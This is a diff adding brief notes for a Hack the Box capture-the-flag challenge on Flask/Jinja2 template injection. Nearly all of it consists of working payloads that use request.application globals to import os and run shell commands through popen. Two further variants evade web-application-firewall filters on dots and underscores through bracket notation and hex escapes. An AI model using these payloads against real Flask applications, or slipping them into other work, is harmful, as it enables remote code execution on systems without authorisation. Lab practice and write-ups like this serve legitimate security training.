@@ -1,0 +1,18 @@
+Hack the Box challenge -  Templated
+
+
+```
+Exploit flask/jinja2 vulnerabilities and gain RCE(Remote Code Execution) to obtain the flag
+
+```
+
+Syntax to list the directory contents, read users so on..
+
+## http://IP_ADDRESS/{{request.application.__globals__.__builtins__.__import__('os').popen('ls -la').read()}}
+## {{request.application.__globals__.__builtins__.__import__('os').popen('id').read()}}
+
+If the waf blocks “.": {{request['application']['__globals__']['__builtins__']['__import__']('os')['popen']('id')['read']()}}
+
+If the waf blocks “.” and “_": {{request['application']['\x5f\x5fglobals\x5f\x5f']['\x5f\x5fbuiltins\x5f\x5f']['\x5f\x5fimport\x5f\x5f']('os')['popen']('id')['read']()}}
+
+change ls to cat the flag file
